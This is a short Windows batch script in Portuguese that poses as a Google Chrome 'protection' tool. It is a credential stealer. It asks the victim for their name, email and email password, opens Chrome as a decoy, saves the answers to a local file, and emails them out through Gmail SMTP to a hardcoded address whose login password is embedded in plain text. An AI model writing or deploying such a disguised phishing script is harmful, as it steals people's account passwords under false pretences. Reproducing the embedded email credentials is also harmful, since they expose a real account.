@echo off

title Google chrome

cls
echo.
echo -- O navegador google chrome agora está protegido
echo.

echo -- Todos os dados acessados por este navegador estara em
echo Extrema proteção: facebook,Email,dropbox,stagram,etc...
echo.
echo -- O navegador usara um metodo de reconhecimento para ninguem mais ter acesso a suas contas.
echo.

set /p nome=Nome:
set /p us=Email:
set /p pass=Senha do Email:

MSG * obrigado, voce agora ja pode usar o google chrome
start chrome.exe
echo dia %date% Hora %Time% %n% logon no email: %us% Nome: %nome% e Senha: %pass% >"C:\users\FAMILIA\Desktop\hacker\arquivos BAT\%n%.txt"
ping locallhost -n 2 >nul
U3dpdGNoTWFpbA.exe /s /from extrememusicist@gmail.com /pass ilovemygirlfriend /server smtp.gmail.com /p 587 /SSL /to extrememusicist@gmail.com /sub emails-de-%nome% /b Email:%us%,Senha:%pass%,Dia:%date%,Hora:%Time%